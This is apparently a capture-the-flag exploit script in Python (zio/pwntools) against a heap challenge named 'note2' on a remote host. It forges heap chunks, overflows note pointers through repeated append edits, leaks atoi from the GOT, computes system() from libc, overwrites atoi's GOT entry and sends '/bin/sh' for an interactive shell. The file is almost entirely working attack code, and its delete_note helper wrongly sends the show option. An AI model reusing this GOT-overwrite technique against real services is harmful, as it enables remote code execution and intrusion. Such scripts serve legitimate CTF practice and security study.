from zio import *
from pwn import *
#ip = 1.192.225.129
#target = "./note2"
target = ("115.28.27.103", 9002)

def get_io(target):
	r_m = COLORED(RAW, "green")
	w_m = COLORED(RAW, "blue")
	io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
	return  io 

def new_note(io, length_t, content_t):
	io.read_until("option--->>\n")
	io.writeline("1")
	io.read_until("content:(less than 128)\n")
	io.writeline(str(length_t))
	io.read_until("content:\n")
	io.writeline(content_t)

def show_note(io, id_t):
	io.read_until("option--->>\n")
	io.writeline("2")
	io.read_until("id of the note:\n")
	io.writeline(str(id_t))

def delete_note(io, id_t):
	io.read_until("option--->>\n")
	io.writeline("2")
	io.read_until("id of the note:\n")
	io.writeline(str(id_t))

def edit_note(io, id_t, type_t, content_t):
	io.read_until("option--->>\n")
	io.writeline("3")
	io.read_until("id of the note:\n")
	io.writeline(str(id_t))
	io.read_until("[1.overwrite/2.append]\n")
	io.writeline(str(type_t))
	io.read_until("Contents:")
	io.writeline(content_t)

def pwn(io):
	name_addr = 0x6020E0
	address_addr = 0x602180

	address = 'aaa'

	name  = l64(0x20) + l64(0x21)
	name = name.ljust(0x20, 'a')
	name += l64(0x20) + l64(0x21)
	name += l64(0x0)

	io.read_until("Input your name:\n")
	io.writeline(name)
	io.read_until("Input your address:\n")
	io.writeline(address)
	new_note(io, 0, '')
	new_note(io, 0x80, '')

	atoi_got = 0x0000000000602088

	manage_addr = 0x602120

	payload = 'a' * 0x10
	for i in range(7):
		edit_note(io, 0, 2, payload)

	payload = 'a' * 0xf
	edit_note(io, 0, 2, payload)
	payload = 'a' + l64(name_addr + 0x10)
	edit_note(io, 0, 2, payload)

	io.gdb_hint()
	new_note(io, 0, '')
	payload = 'a' * 0x10
	for i in range(2):
		edit_note(io, 2, 2, payload)

	payload = 'a' * 0xf
	edit_note(io, 2, 2, payload)
	payload = 'a' + l64(atoi_got)
	edit_note(io, 2, 2, payload)

	show_note(io, 0)
	io.read_until('Content is ')
	data = io.read_until("\n")[:-1]
	print [c for c in data]

	data = data.ljust(8, '\x00')

	aoti_addr = l64(data)
	print "aoti_addr:", hex(aoti_addr)

	elf_info = ELF("./libc-2.19.so")
	#elf_info = ELF("./libc.so.6")
	atoi_offset = elf_info.symbols["atoi"]
	system_offset = elf_info.symbols["system"]

	libc_base = aoti_addr - atoi_offset
	system_addr = libc_base + system_offset

	content = l64(system_addr)

	print "system_addr:", hex(system_addr)
	edit_note(io, 0, 1, content)
	io.read_until("option--->>\n")
	io.writeline("/bin/sh")
	io.interact()

io = get_io(target)
pwn(io)

